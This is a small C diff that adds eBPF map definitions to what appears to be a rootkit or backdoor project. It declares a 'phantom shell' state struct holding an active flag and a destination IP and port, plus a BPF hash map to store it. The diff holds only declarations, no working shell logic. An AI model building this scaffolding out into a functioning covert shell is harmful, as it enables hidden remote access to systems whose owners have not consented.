@@ -44,6 +44,13 @@ struct backdoor_packet_log_data_16{
 	struct trigger_16_t trigger_array[6];
 };
 
+//Map value, contains data of phantom shell, if active
+struct backdoor_phantom_shell_data{
+	int active;
+	__u32 d_ip;
+	__u16 d_port;
+};
+
 
 struct fs_priv_open{ //Map
 	__uint(type, BPF_MAP_TYPE_HASH);
@@ -72,6 +79,15 @@ struct backdoor_priv_packet_log_16{
 	__type(key, __u32); //Source IPv4 of packet
 	__type(value, struct backdoor_packet_log_data_16);
 } backdoor_packet_log_16 SEC(".maps");
+
+
+//Map to store state and data of phantom shell
+struct backdoor_priv_phantom_shell{ 
+	__uint(type, BPF_MAP_TYPE_HASH);
+	__uint(max_entries, 1);
+	__type(key, __u64); //Source IPv4 of packet
+	__type(value, struct backdoor_phantom_shell_data);
+} backdoor_phantom_shell SEC(".maps");
 
 
 /*PROTECTED MAPS*/
